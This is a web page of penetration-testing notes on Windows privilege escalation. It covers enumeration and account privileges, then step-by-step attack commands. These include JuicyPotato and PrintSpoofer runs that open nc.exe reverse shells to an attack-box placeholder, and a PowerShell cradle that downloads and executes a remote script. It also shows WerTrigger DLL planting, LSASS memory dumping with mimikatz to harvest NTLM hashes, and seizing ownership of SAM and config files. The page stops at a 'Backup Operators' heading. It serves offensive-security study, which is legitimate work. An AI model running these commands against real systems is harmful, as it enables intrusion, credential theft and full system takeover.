<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/windows-exploitation/privilege-escalation</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/windows-exploitation/privilege-escalation"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/">home</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>Privilege escalation</h1>

<p>We often gain a low-privileged foothold on our targets at first: we need to perform privilege escalation through various means to get either access to a member of the <code>Local Administrators</code> group, the built-in local <code>administrator</code> account, or the <code>NT AUTHORITY\SYSTEM</code> account. This document aims to gather every aspect related to this part of an assessment.</p>

<h2>Enumeration</h2>

<h3>Enumerating the network</h3>

<p>Enumeration is key. Looking at network information is a good first step, as our current target might be dual-homed: that is, belonging to two or more different networks. Viewing the ARP cache might also reveal other hosts that our target recently communicated with:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># List interfaces, IP addresses, and DNS info:</span><span class="w">
</span><span class="n">ipconfig</span><span class="w"> </span><span class="nx">/all</span><span class="w">

</span><span class="c"># View ARP table:</span><span class="w">
</span><span class="n">arp</span><span class="w"> </span><span class="nt">-a</span><span class="w"> 

</span><span class="c"># View routing table:</span><span class="w">
</span><span class="n">route</span><span class="w"> </span><span class="nx">print</span><span class="w">
</span></code></pre></div>

<h3>Enumerating protections</h3>

<p>Because they might interfere with our enumeration, getting a good awareness of protections in place is crucial. Most modern environments have anti-viruses and/or EDRs in place to alert on and block threats. For instance, AppLocker is often used to create rules that allow or deny apps, depending on their info, or the users or groups running them.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Check Windows Defender status:</span><span class="w">
</span><span class="n">Get-MpComputerStatus</span><span class="w">

</span><span class="c"># List AppLocker rules, powershell only:</span><span class="w">
</span><span class="n">Get-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Effective</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">RuleCollections</span><span class="w">

</span><span class="c"># Test AppLocker policy for a command:</span><span class="w">
</span><span class="n">Get-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Local</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Test-AppLockerPolicy</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nt">-User</span><span class="w"> </span><span class="nx">Everyone</span><span class="w">
</span></code></pre></div>

<h3>Enumerating the system</h3>

<p>Enumerating the target system we landed on is crucial: the <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands" rel="nofollow">Windows commands reference</a> is really handy for manual enumeration. Here are a few commands:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># List running processes:</span><span class="w">
</span><span class="n">tasklist</span><span class="w"> </span><span class="nx">/svc</span><span class="w">

</span><span class="c"># List all environment variables,</span><span class="w">
</span><span class="c"># as well as home drive path and more:</span><span class="w">
</span><span class="n">set</span><span class="w">

</span><span class="c"># View detailed config info.</span><span class="w">
</span><span class="c"># Pay attention to System Boot Time to</span><span class="w">
</span><span class="c"># check if the target hasn't been restarted</span><span class="w">
</span><span class="c"># for a long time. Also check Hotfix and OS</span><span class="w">
</span><span class="c"># Version to search possible exploits:</span><span class="w">
</span><span class="n">systeminfo</span><span class="w">

</span><span class="c"># Display hotfixes with WMI and Quick Fix</span><span class="w">
</span><span class="c"># Engineering, if systeminfo doesn't list</span><span class="w">
</span><span class="c"># them:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">qfe</span><span class="w">

</span><span class="c"># Alternatively, list them with powershell:</span><span class="w">
</span><span class="n">Get-HotFix</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nt">-AutoSize</span><span class="w">

</span><span class="c"># List installed programs:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">product</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="w">

</span><span class="c"># List installed programs with powershell:</span><span class="w">
</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">Win32_Product</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">Version</span><span class="w">

</span><span class="c"># List what services are running on which ports:</span><span class="w">
</span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w">

</span><span class="c"># Find process name by PID, from netstat output:</span><span class="w">
</span><span class="n">tasklist</span><span class="w"> </span><span class="nx">/fi</span><span class="w"> </span><span class="s2">"pid eq &lt;PID&gt;"</span><span class="w">
</span></code></pre></div>

<h3>Enumerating users</h3>

<p>Users are often the weakest link to gain privilege escalation, so we must pay close attention to them.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Check for logged-in users:</span><span class="w">
</span><span class="n">query</span><span class="w"> </span><span class="nx">user</span><span class="w">

</span><span class="c"># Check our current user:</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">USERNAME</span><span class="o">%</span><span class="w">

</span><span class="c"># Check current user's privileges:</span><span class="w">
</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">

</span><span class="c"># Check current user's group info:</span><span class="w">
</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w">

</span><span class="c"># List all users:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w">

</span><span class="c"># List all groups:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w">

</span><span class="c"># Get details about a group:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">group</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># Get password policy and accounts info:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">accounts</span><span class="w">
</span></code></pre></div>

<h3>Enumerating processes</h3>

<p>All processes should be checked closely. It doesn&#39;t always matter to find one running as an administrator, as low-privileged ones can still have the <code>SeImpersonate</code> token set, which can be leveraged to SYSTEM permissions with Rogue/Juicy/Lonely Potato.</p>

<p>Access tokens describe the security context of a process or thread. They include information about the user account tied to the process/thread and their privileges.</p>

<p>It&#39;s worth looking for interesting processes that can only be accessed on localhost, broadcast or unusual addresses using <code>netstat -ano</code>. Look for connections listening on <code>127.0.0.1</code>, <code>::1</code>, <code>0.0.0.0</code>, <code>::/0</code>, or simply other addresses than our target.</p>

<p>Processes also communicate between them through named pipes, which are essentially files stored in memory that get cleared out after being read. Named pipes are often changed to masquerade as another program, i.e. using <code>mojo</code> instead of <code>msagent</code>. Processes can also use anonymous pipes instead of named pipes.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># List named pipes, if the</span><span class="w">
</span><span class="c"># sysinternals suite is present:</span><span class="w">
</span><span class="n">pipelist.exe</span><span class="w"> </span><span class="nx">/accepteula</span><span class="w">

</span><span class="c"># Alternatively, list named pipes</span><span class="w">
</span><span class="c"># with powershell:</span><span class="w">
</span><span class="n">gci</span><span class="w"> </span><span class="nx">\\.\pipe\</span><span class="w">

</span><span class="c"># Enumerate permissions of a named pipe,</span><span class="w">
</span><span class="c"># if sysinternals suite is present:</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nx">/accepteula</span><span class="w"> </span><span class="nx">\\.\pipe\</span><span class="err">&lt;</span><span class="nx">pipe</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-v</span><span class="w">

</span><span class="c"># Enumerate permissions of all named pipes:</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nx">/accepteula</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">\pipe\</span><span class="o">*</span><span class="w"> </span><span class="nt">-v</span><span class="w">
</span></code></pre></div>

<h2>Access rights and privileges overview</h2>

<p>Access rights, which define if someone can access an object on a Windows system, are granted based on security principals, who are anything that can get authenticated by the Windows operating system:</p>

<ul>
<li>User and computer accounts.</li>
<li>Processes running in the security context or another user/computer account.</li>
<li>Security groups that these accounts belong to.</li>
</ul>

<p>All security principals are identified by a unique Security Identifier (SID). Once assigned, the SID remains the same for the entire lifetime of the security principal.</p>

<p>When a security principal tries to access an object on Windows (a folder, a file on a share, etc), its SID is compared against the <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-entries" rel="nofollow">Access Control Entries (ACEs)</a> within the object&#39;s <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptors" rel="nofollow">security descriptor</a>. After comparison, access is either granted or denied. This is done every time a security principal tries to access an object, all the time.</p>

<p>Privileges are contained within groups, that grant their members specific rights. Some of these groups include:</p>

<table><thead>
<tr>
<th>Group</th>
<th>Description</th>
</tr>
</thead><tbody>
<tr>
<td>Default Administrators</td>
<td>Domain admins and Enterprise admins.</td>
</tr>
<tr>
<td>Server Operators</td>
<td>Can modify services, access SMB shares and backup files.</td>
</tr>
<tr>
<td>Backup Operators</td>
<td>Can log onto DCs, many rights equivalent to domain admins.</td>
</tr>
<tr>
<td>Print Operators</td>
<td>Can log onto DCs, can be tricked using a malicious driver.</td>
</tr>
<tr>
<td>Hyper-V Administrators</td>
<td>Equivalent to domain admins if virtualization is present.</td>
</tr>
<tr>
<td>Account operators</td>
<td>Can modify non-protected accounts and groups in domain.</td>
</tr>
<tr>
<td>Remote Desktop Users</td>
<td>Can be useful to move laterally with RDP.</td>
</tr>
<tr>
<td>Remote Management Users</td>
<td>Can log onto DCs with PSRemoting.</td>
</tr>
<tr>
<td>Group Policy Owners</td>
<td>Can create GPOs but needs more perms to bind them to domain.</td>
</tr>
<tr>
<td>Schema Admins</td>
<td>Can modify AD schema and add a backdoor for new group/GPO.</td>
</tr>
<tr>
<td>DNS Admins</td>
<td>Can load a malicious DLL on a DC, or create a WPAD record.</td>
</tr>
</tbody></table>

<p>More about creating a WPAD record can be found <a href="https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/" rel="nofollow">here</a>.</p>

<p>Depending on these groups as well as privileges assigned via domain and local group policy, the <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment" rel="nofollow">following rights</a> can be assigned to a user, which applies to the localhost. This only lists the main ones as more exist:</p>

<ul>
<li><p>SeNetworkLogonRight:</p>

<ul>
<li>Setting name: Access this computer from the network.</li>
<li>By default: Administrators and Authenticated Users.</li>
<li>Determines which users can connect to the device from the network, using SMB, NetBIOS, CIFS and COM+.</li>
</ul></li>
<li><p>SeRemoteInteractiveLogonRight:</p>

<ul>
<li>Setting name: Allow log on through Remote Desktop Services.</li>
<li>By default: Administrators and Remote Desktop Users.</li>
<li>Determines which users can access the login screen of a remote device through a Remote Desktop Services connection, but not login in itself.</li>
</ul></li>
<li><p>SeBackupPrivilege:</p>

<ul>
<li>Setting name: Back up files and directories.</li>
<li>By default: Administrators.</li>
<li>Determines which users can bypass file, directory, and other object permissions for backing up the system.</li>
</ul></li>
<li><p>SeSecurityPrivilege:</p>

<ul>
<li>Setting name: Manage auditing and security log.</li>
<li>By default: Administrators.</li>
<li>Determines which users can specify object access audit options, and view and clear the security log in Event Viewer.</li>
</ul></li>
<li><p>SeTakeOwnershipPrivilege:</p>

<ul>
<li>Setting name: Take ownership of files or other objects.</li>
<li>By default: Administrators.</li>
<li>Determines which users can take ownership of any securable object: AD objects, NTFS files and folders, printers, registry keys and more.</li>
</ul></li>
<li><p>SeDebugPrivilege:</p>

<ul>
<li>Setting name: Debug programs.</li>
<li>By default: Administrators.</li>
<li>Determines which users can attach or open any process, no matter the owner. This is used for developers debugging system components, not applications.</li>
</ul></li>
<li><p>SeImpersonatePrivilege:</p>

<ul>
<li>Setting name: Impersonate a client after authentication.</li>
<li>By default: Administrators, local service, network service, service.</li>
<li>Determines which programs can impersonate a user and act on behalf of them.</li>
</ul></li>
<li><p>SeLoadDriverPrivilege:</p>

<ul>
<li>Setting name: Load and unload device drivers.</li>
<li>By default: Administrators.</li>
<li>Determines which users can dynamically load and unload device drivers, which run as highly privileged code.</li>
</ul></li>
<li><p>SeRestorePrivilege:</p>

<ul>
<li>Setting name: Restore files and directories.</li>
<li>By default: Administrators.</li>
<li>Determines which users can bypass file, directory, registry and more object permissions to restore backed up files and directories. They can also set existing security principals as the owner of an object.</li>
</ul></li>
</ul>

<p>While <code>whoami /priv</code> can list rights assigned to our current user, it&#39;s important to remember we might not see all of them unless we run an elevated prompt, to list administrative rights as well. This is a security feature set since Windows Vista to ensure applications are not running with full permissions unless necessary, along with the User Account Control (UAC) prompt.</p>

<p>If a privilege is listed as <code>disabled</code>, it is still assigned to us but needs to be enabled: no default command is available for that, but <a href="https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1" rel="nofollow">custom</a> <a href="https://www.leeholmes.com/adjusting-token-privileges-in-powershell/" rel="nofollow">scripts</a> have been developed. This <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1" rel="nofollow">script</a> is also available.</p>

<h2>Escalating privileges with user privileges</h2>

<h3>Leveraging SeImpersonate and SeAssignPrimaryToken</h3>

<p>Every process in Windows has a token containing info about the account running it. These tokens are not secured, but only a user with <code>SeImpersonate</code> privileges can use them.</p>

<p>Potato exploits trick processes running as <code>SYSTEM</code> to connect to their process, handing over their privileged token. If our current user have <code>SeImpersonate</code> privileges, aiming for potato exploits and PoCs should absolutely be considered to escalate our privileges.</p>

<p>If our foothold on a Windows system is through the exploitation of a service account, like Jenkins, we will often have this privilege available to us. Further details on token impersonation can be found <a href="https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt" rel="nofollow">here</a>.</p>

<p>Let&#39;s say we got access to a SQL Server service account by leveraging <code>xp_cmdshell</code>, as shown <a href="https://ovelny.sh/chaos/protocols-and-systems/MSSQL/" rel="nofollow">here</a>. Running <code>whoami /priv</code> shows that the account both have <code>SeAssignPrimaryTokenPrivilege</code> and <code>SeImpersonatePrivilege</code> privileges set. We can upload and use <a href="https://github.com/ohpe/juicy-potato" rel="nofollow">JuicyPotato</a> to leverage said privileges and impersonate the <code>NT AUTHORITY\SYSTEM</code> account. A good location to upload payloads and scripts on our target is <code>C:\Windows\Temp</code>, as it is usually writeable.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Run JuicyPotato with the following settings,</span><span class="w">
</span><span class="c"># using a nc.exe binary uploaded on target:</span><span class="w">
</span><span class="c"># * COM server listening port with -l</span><span class="w">
</span><span class="c"># * program to launch with -p</span><span class="w">
</span><span class="c"># * argument passed to program with -a</span><span class="w">
</span><span class="c"># * make a createprocess call with -t</span><span class="w">
</span><span class="c"># * try CreateProcessWithTokenW function with SeImpersonate privilege</span><span class="w">
</span><span class="c"># * try CreateProcessAsUser function with SeAssignPrimaryToken privilege</span><span class="w">
</span><span class="n">C:\Windows\Temp\JuicyPotato.exe</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">1337</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">c:\windows\system32\cmd.exe</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="s2">"/c c:\windows\temp\nc.exe -e cmd.exe &lt;attack box IP&gt; &lt;attack box port&gt;"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="o">*</span><span class="w">

</span><span class="c"># Another method without using nc.exe.</span><span class="w">
</span><span class="c"># Add the following last line in Invoke-PowerShellTcp.ps1:</span><span class="w">
</span><span class="c"># Invoke-PowerShellTcp -Reverse -IPAddress &lt;attack box IP&gt; -Port &lt;attack box port&gt;</span><span class="w">
</span><span class="c"># Then, set up a python HTTP server on your attack box and call</span><span class="w">
</span><span class="c"># JuicyPotato with this command:</span><span class="w">
</span><span class="n">C:\Windows\Temp\JuicyPotato.exe</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">1337</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">c:\windows\system32\cmd.exe</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="s2">"/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://&lt;attack box IP&gt;:&lt;attack box port&gt;/Invoke-PowerShellTcp.ps1')"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="o">*</span><span class="w">
</span></code></pre></div>

<p>If we&#39;ve set up a listener on our attack box beforehand, we will catch a shell as <code>NT AUTHORITY\SYSTEM</code>.</p>

<p>Sometimes the CLSID (the parameter of the -c flag) will not work. In that case, we can try others depending on our target <a href="https://ohpe.it/juicy-potato/CLSID/" rel="nofollow">here</a>.</p>

<p>It&#39;s important to note that JuicyPotato doesn&#39;t work on Windows Server 2019 and Windows 10 build 1809 onwards. For these systems, we can use PrintSpoofer and RoguePotato instead. More about PrintSpoofer can be found <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" rel="nofollow">here</a>. Under the same scenario with a MSSQL service account takeover, we could upload PrintSpoofer and run:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Run a reverse shell with nc.exe to our attack box:</span><span class="w">
</span><span class="n">c:\tools\PrintSpoofer.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"c:\tools\nc.exe &lt;attack box IP&gt; &lt;attack box port&gt; -e cmd"</span><span class="w">
</span></code></pre></div>

<p>Which will also catch a shell as <code>NT AUTHORITY\SYSTEM</code> on our attack box&#39;s listener.</p>

<h3>Leveraging SeManageVolumePrivilege</h3>

<p>If our user have <code>SeManageVolumePrivilege</code> set, we can use the following exploit to grant ourselves full permissions on the C:\ drive: <a href="https://github.com/CsEnox/SeManageVolumeExploit" rel="nofollow">https://github.com/CsEnox/SeManageVolumeExploit</a></p>

<p>Once we run the exploit, we&#39;re still left with a way to leverage this broad access to a SYSTEM shell. For this, we can use WerTrigger PoC: <a href="https://github.com/sailay1996/WerTrigger" rel="nofollow">https://github.com/sailay1996/WerTrigger</a></p>

<p>Clone the repo, and upload the following files located in /bin on our target:</p>

<ul>
<li>phoneinfo.dll</li>
<li>Report.wer</li>
<li>WerTrigger.exe</li>
</ul>

<p>Copy <code>phoneinfo.dll</code> to <code>C:\Windows\System32\</code>:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">copy</span><span class="w"> </span><span class="nx">phoneinfo.dll</span><span class="w"> </span><span class="nx">C:\Windows\System32\</span><span class="w">
</span></code></pre></div>

<p><code>Report.wer</code> and <code>WerTrigger.exe</code> must be located in the same directory. If they are, run the exploit:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">WerTrigger.exe</span><span class="w">
</span></code></pre></div>

<p>The exploit will connect to 127.0.0.1 port 1337 and silently listen. Even if the commands are run blind, they will work. If we uploaded nc.exe or nc64.exe beforehand, we can call this program to get a SYSTEM shell on our attack box. Set up a listener first:</p>

<div class="highlight"><pre class="highlight shell"><code>rlwrap nc <span class="nt">-lvnp</span> &lt;port&gt;
</code></pre></div>

<p>And from WerTrigger, launch the connection:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">c:\Users\Public\Documents\nc64.exe</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">port</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">
</span></code></pre></div>

<h3>Leveraging SeDebugPrivilege</h3>

<p>If a user we have access to has the <code>SeDebugPrivilege</code> set, we can use <code>ProcDump</code> from sysinternals and dump the memory of any process. Aiming for the Local Security Authority Subsystem Service (LSASS), which holds user credentials once they logged on the system, is a good idea for privilege escalation and/or lateral movement. Once this is done, we can load the dump in mimikatz to get credentials:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Dump LSASS credentials:</span><span class="w">
</span><span class="n">procdump.exe</span><span class="w"> </span><span class="nt">-accepteula</span><span class="w"> </span><span class="nt">-ma</span><span class="w"> </span><span class="nx">lsass.exe</span><span class="w"> </span><span class="nx">lsass.dmp</span><span class="w">

</span><span class="c"># Run mimikatz:</span><span class="w">
</span><span class="n">mimikatz.exe</span><span class="w">

</span><span class="c"># From mimikatz prompt, ensure</span><span class="w">
</span><span class="c"># all command output will be logged</span><span class="w">
</span><span class="c"># in mimikatz.log:</span><span class="w">
</span><span class="n">log</span><span class="w">

</span><span class="c"># Use our previous dump in mimikatz:</span><span class="w">
</span><span class="n">sekurlsa::minidump</span><span class="w"> </span><span class="nx">lsass.dmp</span><span class="w">

</span><span class="c"># List NTLM hashes of user credentials:</span><span class="w">
</span><span class="n">sekurlsa::logonpasswords</span><span class="w">
</span></code></pre></div>

<p>If we can&#39;t upload tools on our target but have RDP access, we can also run the task manager, go to the <code>Details</code> tab, select <code>lsass.exe</code> and right-click -&gt; create dump file. This dump file can then be downloaded and analyzed in our attack box.</p>

<p>NTLM hashes resulting from this extraction can then be cracked offline or used in a pass-the-hash attack to move laterally.</p>

<p><code>SeDebugPrivilege</code> can also be used for remote code execution: by launching a child process, we can use this privilege to inherit the token of a parent process and impersonate it. If the parent process is running as <code>SYSTEM</code>, we can elevate our privileges this way.</p>

<p>We can upload this <a href="https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1" rel="nofollow">PoC script</a> on the target system and run it. First, open an elevated powershell console and run <code>tasklist</code>. Identify a process likely to run as <code>SYSTEM</code> and leverage it with the script:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Import script:</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\psgetsys.ps1</span><span class="w"> 

</span><span class="c"># Run script to escalate our privileges:</span><span class="w">
</span><span class="n">ImpersonateFromParentPid</span><span class="w"> </span><span class="nt">-ppid</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">parent</span><span class="w"> </span><span class="nx">PID</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-command</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">command</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">execute</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-cmdargs</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">command</span><span class="w"> </span><span class="nx">arguments</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<h3>Leveraging SeTakeOwnershipPrivilege</h3>

<p>SeTakeOwnershipPrivilege allows a user to take ownership of any securable object: AD objects, NTFS files/folders, printers, registry keys and more. The user can change <code>WRITE_OWNER</code> rights over an object to change the owner. It is assigned by default for administrators and rarely encountered for other users, but a service account might still have it for backups, even if SeBackupPrivilege / SeRestorePrivilege / SeSecurityPrivilege could be used for this purpose.</p>

<p>In other situations, we might be able to assign this privilege to an user via the local group policy editor, under <code>Computer Configuration &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment</code>.</p>

<p>Whether we assign this privilege or find a user already having it, we can gain access to sensitive data or take control of a shared folder. Be careful as changing the owner of a file might disrupt an application using it, or disrupt users directly.</p>

<p>Some interesting files may include:</p>

<div class="highlight"><pre class="highlight plaintext"><code>c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
</code></pre></div>

<p>Which we might be able to read with the following:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># List current user's privileges:</span><span class="w">
</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">

</span><span class="c"># If the privilege is shown as disabled,</span><span class="w">
</span><span class="c"># enable it with EnableAllTokenPrivs.ps1:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\EnableAllTokenPrivs.ps1</span><span class="w">
</span><span class="o">.</span><span class="n">\EnableAllTokenPrivs.ps1</span><span class="w">

</span><span class="c"># Check if it worked:</span><span class="w">
</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">

</span><span class="c"># Get info about a file we want to access:</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'C:\&lt;file path&gt;'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">Fullname</span><span class="p">,</span><span class="nx">LastWriteTime</span><span class="p">,</span><span class="nx">Attributes</span><span class="p">,@{</span><span class="nx">Name</span><span class="o">=</span><span class="s2">"Owner"</span><span class="p">;</span><span class="nx">Expression</span><span class="o">=</span><span class="p">{</span><span class="w"> </span><span class="p">(</span><span class="n">Get-Acl</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">FullName</span><span class="p">)</span><span class="o">.</span><span class="nf">Owner</span><span class="w"> </span><span class="p">}}</span><span class="w">

</span><span class="c"># If we can't see the owner of the file due</span><span class="w">
</span><span class="c"># to a lack of permissions, we can check the</span><span class="w">
</span><span class="c"># owner of the parent folder:</span><span class="w">
</span><span class="nx">cmd</span><span class="w"> </span><span class="err">/</span><span class="nx">c</span><span class="w"> </span><span class="nx">dir</span><span class="w"> </span><span class="err">/</span><span class="nx">q</span><span class="w"> </span><span class="s1">'C:\&lt;folder path&gt;'</span><span class="w">

</span><span class="c"># Change the ownership of the file with</span><span class="w">
</span><span class="c"># takeown Windows binary: </span><span class="w">
</span><span class="nx">takeown</span><span class="w"> </span><span class="err">/</span><span class="nx">f</span><span class="w"> </span><span class="s1">'C:\&lt;file path&gt;'</span><span class="w">

</span><span class="c"># Confirm we changed the owner:</span><span class="w">
</span><span class="nx">Get</span><span class="err">-</span><span class="nx">ChildItem</span><span class="w"> </span><span class="err">-</span><span class="nx">Path</span><span class="w"> </span><span class="s1">'C:\&lt;file path&gt;'</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="nx">select</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">directory</span><span class="p">,</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="o">=</span><span class="s2">"Owner"</span><span class="p">;</span><span class="nx">Expression</span><span class="o">=</span><span class="p">{(</span><span class="n">Get-ACL</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Fullname</span><span class="p">)</span><span class="o">.</span><span class="nf">Owner</span><span class="p">}}</span><span class="w">

</span><span class="c"># If we still can't read the file, we</span><span class="w">
</span><span class="c"># might need to modify the file ACL too</span><span class="w">
</span><span class="c"># with icacls:</span><span class="w">
</span><span class="nx">icacls</span><span class="w"> </span><span class="s1">'C:\&lt;file path&gt;'</span><span class="w"> </span><span class="err">/</span><span class="nx">grant</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">current</span><span class="w"> </span><span class="nx">user</span><span class="err">&gt;:</span><span class="nx">F</span><span class="w">
</span></code></pre></div>

<h2>Escalating privileges with group privileges</h2>

<h3>Built-in groups</h3>

<p>As listed earlier, Windows servers ship with many built-in groups, either from the operating system or Active Directory. We can find a list of all built-in groups <a href="https://ss64.com/nt/syntax-security_groups.html" rel="nofollow">here</a>, and a list of privileged accounts and groups in Active Directory <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" rel="nofollow">here</a>.</p>

<p>After checking the group memberships for our current user with <code>whoami /groups</code>, here are examples of how we can leverage some of them.</p>

<h3>Leveraging Backup Operators group</h3>

